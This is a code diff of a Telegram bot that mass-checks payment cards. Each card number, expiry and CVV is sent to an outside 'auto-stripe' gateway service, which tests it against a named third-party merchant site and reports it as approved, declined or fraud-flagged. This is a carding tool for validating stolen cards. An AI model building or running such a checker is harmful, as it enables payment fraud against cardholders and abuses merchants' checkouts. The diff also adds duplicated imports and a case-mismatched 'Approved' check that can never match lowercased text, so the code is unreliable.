@@ -1713,10 +1713,18 @@ async def consume_credit(user_id: int) -> bool:
     return False
 
 # === FORMAT STATUS ===
+import asyncio
+import aiohttp
+import time
+from telegram.constants import ParseMode
+from telegram.helpers import escape_markdown
+
+
+# === FORMAT STATUS ===
 def format_status(api_status: str) -> str:
     try:
         clean_status = str(api_status).strip().lower().replace("\n", "").replace("\r", "")
-        if "approved" in clean_status:
+        if "Approved" in clean_status:
             return "𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅"
         elif "declined" in clean_status or "generic decline" in clean_status:
             return "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌"
@@ -1737,13 +1745,12 @@ def format_status(api_status: str) -> str:
         elif "fraudulent" in clean_status:
             return "⚠️ 𝗙𝗥𝗔𝗨𝗗 𝗖𝗔𝗥𝗗 ⚠️"
         else:
-            # fallback normalized
             return api_status.strip().upper()
     except Exception:
         return "❌ ERROR ❌"
 
 
-# === CHECK CARDS BACKGROUND ===
+# === BACKGROUND CHECK ===
 async def check_cards_background(cards_to_check, user_id, user_first_name, processing_msg, start_time):
     approved_count = declined_count = checked_count = error_count = 0
     results = []
@@ -1760,11 +1767,15 @@ async def check_cards_background(cards_to_check, user_id, user_first_name, proce
                 error_count += 1
                 return f"❌ Invalid card format: `{escape_markdown(raw, version=2)}`"
 
+            # Normalize expiry (YYYY → YY)
             if len(parts[2]) == 4:
                 parts[2] = parts[2][-2:]
             cc_normalized = "|".join(parts)
 
-            api_url = f"https://darkboy-auto-stripe-y6qk.onrender.com/gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc={cc_normalized}"
+            api_url = (
+                f"https://darkboy-auto-stripe-y6qk.onrender.com/"
+                f"gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc={cc_normalized}"
+            )
 
             try:
                 async with session.get(api_url, timeout=45) as resp:
@@ -1774,13 +1785,16 @@ async def check_cards_background(cards_to_check, user_id, user_first_name, proce
             except Exception as e:
                 checked_count += 1
                 error_count += 1
-                return f"❌ API Error for card `{escape_markdown(cc_normalized, version=2)}`: {escape_markdown(str(e), version=2)}"
+                return (
+                    f"❌ API Error for card `{escape_markdown(cc_normalized, version=2)}`: "
+                    f"{escape_markdown(str(e), version=2)}"
+                )
 
-            # Use API status
+            # Format API status
             api_response = str(data.get("status", "Unknown")).strip()
             status_text = format_status(api_response)
 
-            # Update counts
+            # Update counters
             api_response_lower = api_response.lower()
             if "approved" in api_response_lower:
                 approved_count += 1
@@ -1788,7 +1802,10 @@ async def check_cards_background(cards_to_check, user_id, user_first_name, proce
                 declined_count += 1
 
             checked_count += 1
-            return f"`{escape_markdown(cc_normalized, version=2)}`\n𝐒𝐭𝐚𝐭𝐮𝐬 ➳ {status_text}"
+            return (
+                f"`{escape_markdown(cc_normalized, version=2)}`\n"
+                f"𝐒𝐭𝐚𝐭𝐮𝐬 ➳ {status_text}"
+            )
 
     async with aiohttp.ClientSession() as session:
         tasks = [check_card(session, raw) for raw in cards_to_check]
@@ -1799,12 +1816,13 @@ async def check_cards_background(cards_to_check, user_id, user_first_name, proce
             result = await coro
             results.append(result)
 
+            # Periodic update
             if time.time() - last_update >= update_interval:
                 last_update = time.time()
                 summary_text = (
                     f"✘ 𝐓𝐨𝐭𝐚𝐥↣{total_cards}\n"
                     f"✘ 𝐂𝐡𝐞𝗰𝗸𝐞𝗱↣{checked_count}\n"
-                    f"✘ 𝐀𝐩𝗽𝗿𝗼𝗏𝗲𝗱↣{approved_count}\n"
+                    f"✘ 𝐀𝐩𝗽𝗿𝗼𝘃𝗲𝗱↣{approved_count}\n"
                     f"✘ 𝐃𝐞𝐜𝗹𝗶𝗻𝗲𝗱↣{declined_count}\n"
                     f"✘ 𝐄𝐫𝗿𝗼𝗿↣{error_count}\n"
                     f"✘ 𝐓𝗶𝗺𝗲↣{round(time.time() - start_time, 2)}s\n"
@@ -1812,25 +1830,32 @@ async def check_cards_background(cards_to_check, user_id, user_first_name, proce
                 )
                 try:
                     await processing_msg.edit_text(
-                        summary_text + "\n\n" + "\n──────── ⸙ ─────────\n".join(results),
-                        parse_mode=ParseMode.MARKDOWN_V2
+                        summary_text
+                        + "\n\n"
+                        + "\n──────── ⸙ ─────────\n".join(results),
+                        parse_mode=ParseMode.MARKDOWN_V2,
                     )
                 except Exception:
                     pass
 
+    # === FINAL SUMMARY ===
     final_time_taken = round(time.time() - start_time, 2)
     final_summary = (
         f"✘ 𝐓𝐨𝐭𝐚𝐥↣{total_cards}\n"
         f"✘ 𝐂𝐡𝐞𝗰𝗸𝐞𝗱↣{checked_count}\n"
-        f"✘ 𝐀𝐩𝗽𝗿𝗼𝗩𝗘𝗗↣{approved_count}\n"
+        f"✘ 𝐀𝐩𝗽𝗿𝗼𝘃𝗲𝗱↣{approved_count}\n"
         f"✘ 𝐃𝐞𝐜𝗹𝗶𝗻𝗲𝗱↣{declined_count}\n"
         f"✘ 𝐄𝐫𝗿𝗼𝗿↣{error_count}\n"
         f"✘ 𝐓𝗶𝗺𝗲↣{final_time_taken}s\n"
         f"\n𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸\n──────── ⸙ ─────────"
     )
+
     await processing_msg.edit_text(
-        final_summary + "\n\n" + "\n──────── ⸙ ─────────\n".join(results) + "\n──────── ⸙ ─────────",
-        parse_mode=ParseMode.MARKDOWN_V2
+        final_summary
+        + "\n\n"
+        + "\n──────── ⸙ ─────────\n".join(results)
+        + "\n──────── ⸙ ─────────",
+        parse_mode=ParseMode.MARKDOWN_V2,
     )
 
 
